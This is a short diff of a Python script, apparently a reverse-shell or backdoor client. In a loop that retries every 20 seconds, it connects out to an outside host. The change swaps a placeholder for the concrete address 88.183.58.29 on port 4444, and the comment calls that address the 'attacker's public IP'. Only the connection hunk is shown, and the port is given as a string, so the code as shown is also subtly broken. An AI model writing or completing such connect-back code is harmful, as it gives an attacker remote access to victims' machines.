@@ -46,7 +46,7 @@ def main():
     while True:
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect(("IP", "port number"))  # Replace with attacker's public IP and port
+            s.connect(("88.183.58.29", "4444"))  # Replace with attacker's public IP and port
             break
         except socket.error:
             time.sleep(20)  # Wait for 20 seconds before retrying
